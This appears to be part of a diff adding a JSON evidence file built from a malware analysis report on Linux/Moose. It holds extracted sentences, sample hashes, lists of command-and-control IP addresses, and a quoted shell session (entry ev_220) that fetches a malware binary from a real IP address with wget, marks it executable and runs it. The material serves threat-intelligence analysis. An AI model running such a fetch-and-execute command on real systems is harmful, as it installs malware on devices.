+    {
+      "id": "ev_152",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 44,
+        "section": "body",
+        "sentence_id": "p44_s1"
+      },
+      "text": "Name Size Description Sniffer configuration size Integer (4 bytes) Optional field .",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_160",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 45,
+        "section": "body",
+        "sentence_id": "p45_s2"
+      },
+      "text": "Name Size Description Sniffer configuration item size Integer (4 bytes) Size of the configuration entry Sniffer configuration Sniffer configuration item size bytes",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_162",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 47,
+        "section": "body",
+        "sentence_id": "p47_s1"
+      },
+      "text": "Evolution of the Species —Malware changelog Version 20 • First version we encountered • ARM variant Version 28 to 29",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_166",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "body",
+        "sentence_id": "p49_s1"
+      },
+      "text": "APPENDIX A: MALWARE SAMPLES Here are the SHA1 hashes, architecture and malware version of the files we’ve encountered:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_174",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 52,
+        "section": "body",
+        "sentence_id": "p52_s1"
+      },
+      "text": "Keep in mind, however, that the compromised system was accessible via credentials that the operators knew, that they were aware of its IP address and they had means to access its interactive console.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_184",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 54,
+        "section": "body",
+        "sentence_id": "p54_s6"
+      },
+      "text": "If the credentials can be used via Telnet to login, if Telnet is enabled by default and if a shell access can be obtained by typing sh in the device’s prompt, then these are very good indicators that a device could be infected by Linux/Moose.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_209",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 24,
+        "section": "rule",
+        "sentence_id": "p24_r5"
+      },
+      "text": "13.3.3.7",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_210",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 24,
+        "section": "rule",
+        "sentence_id": "p24_r6"
+      },
+      "text": "13.3.3.7/15",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_220",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 30,
+        "section": "rule",
+        "sentence_id": "p30_r2"
+      },
+      "text": "# cd /var # rm ./elan2 rm: cannot remove `./elan2': No such file or directory # wget http://77.247.177.36:81/xx/atheros_mips/elan2 Connecting to 77.247.177.36[77.247.177.36]:81 200 OK, File Get Success # chmod +x ./elan2 # ./elan2 Sys init: OK Status: OK",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_226",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 35,
+        "section": "rule",
+        "sentence_id": "p35_r2"
+      },
+      "text": "3. Tunnel destination IP address (network order). ex: 192.168.1.1",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_227",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 35,
+        "section": "rule",
+        "sentence_id": "p35_r3"
+      },
+      "text": "7 The multiple tunnel packet format varies from the simple TCP tunnel. Due to time constraints it was not documented. Interested readers should look at virtual address 0x405A4C of the bfc2a99450977dc7ba2ec0879fb17c612e248ece sample.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_241",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r3"
+      },
+      "text": "10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451 ARM GNU EABI 20",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_242",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r4"
+      },
+      "text": "095ee85aa648de4e557fc243de17d4f00ab2091f ARM GNU EABI 20",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_243",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r5"
+      },
+      "text": "bfc2a99450977dc7ba2ec0879fb17c612e248ece MIPS MIPS32 28",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_244",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r6"
+      },
+      "text": "54041ce90b04698465b866ed169ddf4a269e1e76 MIPS MIPS32 LSB 28",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_245",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r7"
+      },
+      "text": "d648c405507ad62ddb3faa1dd37f659f3676cacf ARM EABI5 28",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_246",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r8"
+      },
+      "text": "85c3439b6773241d11cda78f0ecfea4c07e55fd2 ARM EABI5 28",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_247",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r9"
+      },
+      "text": "216014dba6f1a636c44530fbce06c598d3cf7fa1 ARM EABI5 29",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_248",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r10"
+      },
+      "text": "4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757 MIPS MIPS32 29",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_249",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 49,
+        "section": "rule",
+        "sentence_id": "p49_r11"
+      },
+      "text": "dd7e8211336aa02851f6c67690e2301b9c84bb26 MIPS MIPS32 31",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_251",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 50,
+        "section": "rule",
+        "sentence_id": "p50_r2"
+      },
+      "text": "77.247.177.36:81 93.190.140.221:80 85.159.237.107:81 85.159.237.108:81 77.247.177.87:81",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_252",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 50,
+        "section": "rule",
+        "sentence_id": "p50_r3"
+      },
+      "text": "27.124.41.11 27.124.41.31 27.124.41.31 27.124.41.33 27.124.41.33 27.124.41.52 27.124.41.52 42.119.173.138 77.247.177.31 77.247.177.36 77.247.178.177 79.176.26.142 82.146.63.15 85.159.237.107 85.159.237.108 85.159.237.111 85.159.237.111 93.190.139.123 93.190.139.147 93.190.140.221 93.190.142.113 93.190.143.60 103.238.216.21 103.238.216.216 103.238.216.217 103.238.216.218 103.238.216.22 103.238.216.23",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_253",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 50,
+        "section": "rule",
+        "sentence_id": "p50_r4"
+      },
+      "text": "103.238.216.24 103.238.216.25 103.238.216.26 103.238.216.28 103.238.216.29 103.238.216.30 103.238.216.31 109.201.148.136 109.201.148.201 109.201.148.241 109.236.86.18 109.236.89.208 192.126.184.234 207.244.67.193 217.23.12.124 217.23.2.249 217.23.2.251 217.23.2.252 217.23.2.253 217.23.2.30 217.23.2.47 217.23.2.48 217.23.2.49 217.23.2.52 217.23.2.79 217.23.7.133 217.23.7.211",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_259",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb259"
+      },
+      "text": "checks whether the file /home/hik/start.sh exists on disk. This path is usually associated with",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_260",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb260"
+      },
+      "text": "upon launch, the malware checks whether the file /home/hik/start.sh exists on disk. This path is usually associated with Hik Vision DVRs which are being targeted by embedded malwar",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_108",
+      "page": 33,
+      "candidate_entity_ids": [],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
